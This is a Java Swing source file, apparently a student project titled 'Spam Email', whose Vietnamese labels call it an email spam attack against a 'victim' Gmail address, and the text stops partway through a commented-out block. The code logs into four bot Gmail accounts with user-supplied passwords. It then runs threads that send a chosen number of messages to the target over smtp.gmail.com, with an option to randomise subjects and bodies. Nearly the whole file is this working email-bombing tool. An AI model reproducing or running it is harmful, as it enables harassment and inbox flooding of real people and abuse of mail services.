
package javaapplication8;

import java.awt.Color;
import java.awt.Font;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.swing.JLabel;
import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;
import javax.swing.JOptionPane;
import jdk.nashorn.internal.scripts.JO;

/**
 *
 * @author VHN
 */
public class main extends javax.swing.JFrame {

    Email e1, e2, e3, e4;
    public main() {
        initComponents();
    }

  
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jLabel7 = new javax.swing.JLabel();
        panelBot = new javax.swing.JPanel();
        lbPass2 = new javax.swing.JLabel();
        lbPass3 = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();
        lbPass4 = new javax.swing.JLabel();
        txtBot3 = new javax.swing.JTextField();
        lbEmail3 = new javax.swing.JLabel();
        txtBot4 = new javax.swing.JTextField();
        txtBot1 = new javax.swing.JTextField();
        jLabel6 = new javax.swing.JLabel();
        lbEmail4 = new javax.swing.JLabel();
        lbEmail2 = new javax.swing.JLabel();
        txtBot2 = new javax.swing.JTextField();
        txtPass1 = new javax.swing.JTextField();
        txtPass2 = new javax.swing.JTextField();
        txtPass3 = new javax.swing.JTextField();
        txtPass4 = new javax.swing.JTextField();
        btnSaveBot = new java.awt.Button();
        panelEmailVictim = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        txtEmail = new javax.swing.JTextField();
        jLabel2 = new javax.swing.JLabel();
        txtTieuDe = new javax.swing.JTextField();
        btnSend = new javax.swing.JButton();
        txtSoLan = new javax.swing.JTextField();
        jLabel3 = new javax.swing.JLabel();
        jLabel4 = new javax.swing.JLabel();
        txtNoiDung = new java.awt.TextArea();
        rboRandom = new javax.swing.JRadioButton();
        result = new javax.swing.JPanel();
        jLabel8 = new javax.swing.JLabel();
        jScrollPane1 = new javax.swing.JScrollPane();
        txtKetqua = new javax.swing.JTextArea();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Spam Email");
        setBackground(new java.awt.Color(255, 255, 255));
        setFont(new java.awt.Font("Times New Roman", 0, 14)); // NOI18N
        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowOpened(java.awt.event.WindowEvent evt) {
                formWindowOpened(evt);
            }
        });

        jLabel7.setBackground(new java.awt.Color(255, 255, 102));
        jLabel7.setFont(new java.awt.Font("Tahoma", 1, 48)); // NOI18N
        jLabel7.setForeground(new java.awt.Color(255, 0, 0));
        jLabel7.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel7.setText("Tấn công Spam Email ( GMAIL)");
        jLabel7.setOpaque(true);

        panelBot.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));

        lbPass2.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        lbPass2.setText("Password :");

        lbPass3.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        lbPass3.setText("Password:");

        jLabel5.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        jLabel5.setText("Email bot 1 :");

        lbPass4.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        lbPass4.setText("Password:");

        txtBot3.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N

        lbEmail3.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        lbEmail3.setText("Email bot 3 :");

        txtBot4.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N

        txtBot1.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        txtBot1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                txtBot1ActionPerformed(evt);
            }
        });

        jLabel6.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        jLabel6.setText("Password:");

        lbEmail4.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        lbEmail4.setText("Email bot 4 :");

        lbEmail2.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        lbEmail2.setText("Email bot 2 :");

        txtBot2.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N

        txtPass1.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N

        txtPass2.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N

        txtPass3.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N

        txtPass4.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        txtPass4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                txtPass4ActionPerformed(evt);
            }
        });

        btnSaveBot.setFont(new java.awt.Font("Dialog", 1, 24)); // NOI18N
        btnSaveBot.setForeground(new java.awt.Color(255, 0, 0));
        btnSaveBot.setLabel("Tiến hành tấn công");
        btnSaveBot.setName(""); // NOI18N
        btnSaveBot.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSaveBotActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout panelBotLayout = new javax.swing.GroupLayout(panelBot);
        panelBot.setLayout(panelBotLayout);
        panelBotLayout.setHorizontalGroup(
            panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(panelBotLayout.createSequentialGroup()
                .addGap(40, 40, 40)
                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(panelBotLayout.createSequentialGroup()
                        .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(lbEmail2)
                            .addComponent(lbPass2))
                        .addGap(54, 54, 54)
                        .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                            .addComponent(txtBot2, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(txtPass3, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                        .addGroup(panelBotLayout.createSequentialGroup()
                            .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(jLabel5)
                                    .addComponent(jLabel6))
                                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(lbEmail3)
                                    .addComponent(lbPass3)))
                            .addGap(54, 54, 54)
                            .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                                        .addComponent(txtBot1, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE)
                                        .addComponent(txtBot3, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE))
                                    .addComponent(txtPass1, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addComponent(txtPass2, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE)))
                        .addGroup(panelBotLayout.createSequentialGroup()
                            .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                .addComponent(lbEmail4)
                                .addComponent(lbPass4))
                            .addGap(54, 54, 54)
                            .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                .addComponent(btnSaveBot, javax.swing.GroupLayout.PREFERRED_SIZE, 345, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                                    .addComponent(txtBot4, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addComponent(txtPass4, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE))))))
                .addContainerGap(45, Short.MAX_VALUE))
        );
        panelBotLayout.setVerticalGroup(
            panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(panelBotLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel5)
                    .addComponent(txtBot1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(28, 28, 28)
                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel6)
                    .addComponent(txtPass1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(30, 30, 30)
                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(lbEmail2)
                    .addComponent(txtBot2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(20, 20, 20)
                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lbPass2)
                    .addComponent(txtPass3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(40, 40, 40)
                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(panelBotLayout.createSequentialGroup()
                        .addComponent(lbEmail3)
                        .addGap(20, 20, 20)
                        .addComponent(lbPass3))
                    .addGroup(panelBotLayout.createSequentialGroup()
                        .addComponent(txtBot3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(txtPass2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(33, 33, 33)
                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lbEmail4)
                    .addComponent(txtBot4, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(17, 17, 17)
                .addGroup(panelBotLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lbPass4)
                    .addComponent(txtPass4, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(28, 28, 28)
                .addComponent(btnSaveBot, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );

        btnSaveBot.getAccessibleContext().setAccessibleName("");

        jLabel1.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        jLabel1.setText("Email nạn nhân");

        txtEmail.setFont(new java.awt.Font("Tahoma", 0, 24)); // NOI18N

        jLabel2.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        jLabel2.setText("Tiêu đề mail");

        txtTieuDe.setFont(new java.awt.Font("Tahoma", 0, 24)); // NOI18N

        btnSend.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        btnSend.setText("GỞI");
        btnSend.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSendActionPerformed(evt);
            }
        });

        txtSoLan.setFont(new java.awt.Font("Tahoma", 0, 24)); // NOI18N

        jLabel3.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        jLabel3.setText("Số lần tin gởi: ");

        jLabel4.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        jLabel4.setText("Nội dung tin nhắn:");

        txtNoiDung.setFont(new java.awt.Font("Dialog", 0, 18)); // NOI18N

        rboRandom.setFont(new java.awt.Font("Tahoma", 1, 18)); // NOI18N
        rboRandom.setText("Tạo tiêu đề và nội dung ngẫu nhiên");
        rboRandom.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                rboRandomActionPerformed(evt);
            }
        });

        jLabel8.setFont(new java.awt.Font("Tahoma", 1, 24)); // NOI18N
        jLabel8.setForeground(new java.awt.Color(255, 0, 0));
        jLabel8.setText("KẾT QUẢ");

        txtKetqua.setColumns(20);
        txtKetqua.setFont(new java.awt.Font("Monospaced", 1, 24)); // NOI18N
        txtKetqua.setRows(5);
        txtKetqua.setText("Done\n");
        jScrollPane1.setViewportView(txtKetqua);

        javax.swing.GroupLayout resultLayout = new javax.swing.GroupLayout(result);
        result.setLayout(resultLayout);
        resultLayout.setHorizontalGroup(
            resultLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(resultLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(resultLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel8)
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 564, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(23, Short.MAX_VALUE))
        );
        resultLayout.setVerticalGroup(
            resultLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(resultLayout.createSequentialGroup()
                .addComponent(jLabel8)
                .addGap(18, 18, 18)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 130, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(0, 12, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout panelEmailVictimLayout = new javax.swing.GroupLayout(panelEmailVictim);
        panelEmailVictim.setLayout(panelEmailVictimLayout);
        panelEmailVictimLayout.setHorizontalGroup(
            panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(panelEmailVictimLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(txtNoiDung, javax.swing.GroupLayout.PREFERRED_SIZE, 583, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel3)
                    .addGroup(panelEmailVictimLayout.createSequentialGroup()
                        .addGroup(panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(panelEmailVictimLayout.createSequentialGroup()
                                .addGap(3, 3, 3)
                                .addComponent(jLabel2))
                            .addComponent(jLabel4)
                            .addComponent(jLabel1))
                        .addGap(20, 20, 20)
                        .addGroup(panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(txtSoLan, javax.swing.GroupLayout.PREFERRED_SIZE, 332, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addGroup(panelEmailVictimLayout.createSequentialGroup()
                                .addComponent(txtTieuDe, javax.swing.GroupLayout.PREFERRED_SIZE, 332, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(18, 18, 18)
                                .addComponent(btnSend, javax.swing.GroupLayout.PREFERRED_SIZE, 91, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addComponent(txtEmail, javax.swing.GroupLayout.PREFERRED_SIZE, 441, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(rboRandom, javax.swing.GroupLayout.PREFERRED_SIZE, 366, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addComponent(result, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        panelEmailVictimLayout.setVerticalGroup(
            panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(panelEmailVictimLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(txtEmail, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel1, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, 30, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addGroup(panelEmailVictimLayout.createSequentialGroup()
                        .addComponent(btnSend, javax.swing.GroupLayout.DEFAULT_SIZE, 36, Short.MAX_VALUE)
                        .addGap(1, 1, 1))
                    .addGroup(panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(txtTieuDe, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 30, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(32, 32, 32)
                .addGroup(panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(txtSoLan, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel3, javax.swing.GroupLayout.PREFERRED_SIZE, 30, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(39, 39, 39)
                .addGroup(panelEmailVictimLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel4, javax.swing.GroupLayout.PREFERRED_SIZE, 30, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(rboRandom))
                .addGap(22, 22, 22)
                .addComponent(txtNoiDung, javax.swing.GroupLayout.PREFERRED_SIZE, 265, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(result, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(32, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jLabel7, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 1312, Short.MAX_VALUE)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(panelBot, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(panelEmailVictim, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addComponent(jLabel7, javax.swing.GroupLayout.PREFERRED_SIZE, 89, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(panelBot, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(panelEmailVictim, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
        );

        pack();
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents

    private void btnSendActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSendActionPerformed
        try {
            String emailTarget = txtEmail.getText();
            String title = txtTieuDe.getText();
            int numPacket = Integer.parseInt(txtSoLan.getText());
            String context = txtNoiDung.getText();
            if (emailTarget.length() == 0 || title.length() ==0
                || context.length() ==0 || numPacket <=0    ) {
                JOptionPane.showMessageDialog(rootPane, "Không được bỏ trống");
        
            }
            else{
                e1 = new Email(txtBot1.getText(), txtPass1.getText());
                e2 = new Email(txtBot2.getText(), txtPass2.getText());
                e3 = new Email(txtBot3.getText(), txtPass3.getText());
                e4 = new Email(txtBot4.getText(), txtPass4.getText());
                    
                int packet = Integer.parseInt(txtSoLan.getText());
                
                List<Email> dsEmailbot = new ArrayList<>();
                dsEmailbot.add(e1);
                dsEmailbot.add(e2);
                dsEmailbot.add(e3);
                dsEmailbot.add(e4);
                
                String target = txtEmail.getText();
                if(isGmailAddress(target)==false){
                    JLabel label = new JLabel("Lỗi email");
                    label.setFont(new Font("Arial", Font.BOLD, 18));
                    JOptionPane.showMessageDialog(this,label,"Lỗi email",JOptionPane.WARNING_MESSAGE);
                    return;
                }
                
                panelBot.setVisible(false);
                result.setVisible(true);
                
                
                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");

                for(Email email: dsEmailbot){
                    
                    System.out.print(email.getEmail() + " " + email.getPassword() + "\n");

                    Session session = Session.getInstance(props,
                        new javax.mail.Authenticator() {
                        protected PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(email.getEmail(), email.getPassword());
                        }
                    });


                    Thread t1  = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            for (int i = 0; i < packet; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    
                                    
                                    Transport.send(message);
                                    String kq = txtKetqua.getText();
                                    kq += kq;
                                    txtKetqua.setText(kq + "\n");
                                    System.out.println("Done");

                                } catch (MessagingException e) {
                                    JOptionPane.showMessageDialog(rootPane, e);
                                    throw new RuntimeException(e);
                                }
                            }
                        }
                    });
                    t1.start();
                    /*
                    Thread t2 = new Thread(new Runnable() {
                        @Override
                        public void run() {
                              for (int i = 0; i < packet; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }

                                    Transport.send(message);

                                    System.out.println("Done");

                                } catch (MessagingException e) {


                                        throw new RuntimeException(e);
                                }
                            }  
                        }
                    });
                    t2.start();

                    Thread t3 = new Thread(new Runnable() {
                        @Override
                        public void run() {
                              for (int i = 0; i < packet; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    Transport.send(message);

                                    System.out.println("Done");

                                } catch (MessagingException e) {


                                        throw new RuntimeException(e);
                                }
                            }  
                        }
                    });
                    t3.start();

                    Thread t4 = new Thread(new Runnable() {
                        @Override
                        public void run() {
                              for (int i = 0; i < packet; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    Transport.send(message);

                                    System.out.println("Done");

                                } catch (MessagingException e) {


                                        throw new RuntimeException(e);
                                }
                            }  
                        }
                    });
                    t4.start();

                    Thread t5 = new Thread(new Runnable() {
                        @Override
                        public void run() {
                              for (int i = 0; i < packet; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    Transport.send(message);

                                    System.out.println("Done");

                                } catch (MessagingException e) {


                                        throw new RuntimeException(e);
                                }
                            }  
                        }
                    });
                    t5.start();

                    Thread t6 = new Thread(new Runnable() {
                        @Override
                        public void run() {
                              for (int i = 0; i < 10; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }

                                    Transport.send(message);

                                    System.out.println("Done");

                                } catch (MessagingException e) {


                                        throw new RuntimeException(e);
                                }
                            }  
                        }
                    });
                    t6.start();

                    Thread t7 = new Thread(new Runnable() {
                        @Override
                        public void run() {
                              for (int i = 0; i < 10; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    Transport.send(message);

                                    System.out.println("Done");

                                } catch (MessagingException e) {


                                        throw new RuntimeException(e);
                                }
                            }  
                        }
                    });
                    t7.start();

                    Thread t8 = new Thread(new Runnable() {
                        @Override
                        public void run() {
                              for (int i = 0; i < 10; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    Transport.send(message);

                                    System.out.println("Done");

                                } catch (MessagingException e) {


                                        throw new RuntimeException(e);
                                }
                            }  
                        }
                    });
                    t8.start();

                    Thread t9 = new Thread(new Runnable() {
                        @Override
                        public void run() {
                              for (int i = 0; i < 10; i++) {
                                try {
                                    Message message = new MimeMessage(session);
                                    message.setFrom(new InternetAddress(email.getEmail()));
                                    message.setRecipients(Message.RecipientType.TO,
                                            InternetAddress.parse(target));
                                    if (rboRandom.isSelected()) {
                                        String title = randomString();
                                        String context = randomContext();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    else{
                                        String title = txtTieuDe.getText();
                                        String context = txtNoiDung.getText();
                                        message.setSubject(title);
                                        message.setText(context);
                                    }
                                    Transport.send(message);

